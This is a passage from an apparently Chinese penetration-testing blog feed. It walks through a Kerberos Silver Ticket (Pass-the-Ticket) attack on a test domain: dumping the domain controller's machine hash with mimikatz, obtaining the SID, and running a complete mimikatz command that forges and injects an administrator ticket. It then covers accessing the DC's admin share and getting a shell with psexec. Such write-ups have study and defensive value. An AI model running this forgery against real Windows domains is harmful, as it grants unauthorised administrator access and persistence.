class="headerlink" title="复现过程"></a>复现过程</h2><p>漏洞前提：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.伪造的用户名</span><br><span class="line">2.服务用户hash(dc$账号的hash)</span><br><span class="line">3.用户sid</span><br></pre></td></tr></table></figure></p><p>首先我们用mimikatz来读取计算机的hash<br><img src="/2020/09/20/kerberos-PtT/4.png" alt></p><p>获取sid<br><img src="/2020/09/20/kerberos-PtT/5.png" alt><br>在域内任意一台机器上制作Silver Ticket<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:hacke.testlab /sid:S-1-5-21-306775267-2343279330-10040798 /target:dc.hacke.testlab /service:cifs /rc4:&#123;ntlm hash&#125; /user:administrator /ptt</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/20/kerberos-PtT/6.png" alt></p><p>再次访问dc的c$<br><img src="/2020/09/20/kerberos-PtT/3.png" alt></p><h1 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h1><p>当我们使用票据成功后，后续可使用psexec.exe与目标机器进行交互cmd shell</p><p><a href="https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe" target="_blank" rel="noopener">https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe</a></p><p>不过这两个都是属于后门维持的攻击，还是MS14-068好用啊</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;PtT&quot;&gt;&lt;a href=&quot;#PtT&quot; class=&quot;headerlink&quot; title=&quot;PtT&quot;&gt;&lt;/a&gt;PtT&lt;/h1&gt;&lt;p&gt;Pass the Ticket，基于Kerberos协议进行攻击，通常是用来做&lt;strong&gt;权限维持&lt;/strong&gt;&lt;/p&gt;
-&lt;
-      
-    
-    </summary>
-    
-    
-    
-      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
